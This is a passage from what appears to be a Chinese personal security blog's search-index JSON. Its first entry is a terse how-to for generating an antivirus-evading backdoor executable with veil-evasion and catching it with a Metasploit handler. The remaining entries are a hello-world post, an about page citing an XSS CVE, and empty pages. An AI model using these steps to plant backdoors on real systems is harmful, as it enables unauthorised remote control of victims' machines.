title=\"使用veil-veasion生成后门：\"></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p>\n<p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>\n<p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>\n","categories":[],"tags":["metasploit"]},{"title":"Hello World","url":"http://yoursite.com/2017/01/14/hello world/","content":"<p>寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。</p>\n<p>随便写写说的好像有人会来看的样子。。。</p>\n","categories":[],"tags":[]},{"title":"about","url":"http://yoursite.com/about/index.html","content":"<p>Cdut, 1996, Summer.<br>左手coding, 右手hacking. 是代码菜鸡, 也是脚本小子.<br>剑未配妥, 出门已是江湖…</p>\n<p>CVE:<br>[CVE-2018-10073] XSS in joyplus CMS</p>\n","categories":[],"tags":[]},{"title":"category","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://yoursite.com/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://yoursite.com/tag/index.html","content":"","categories":[],"tags":[]}]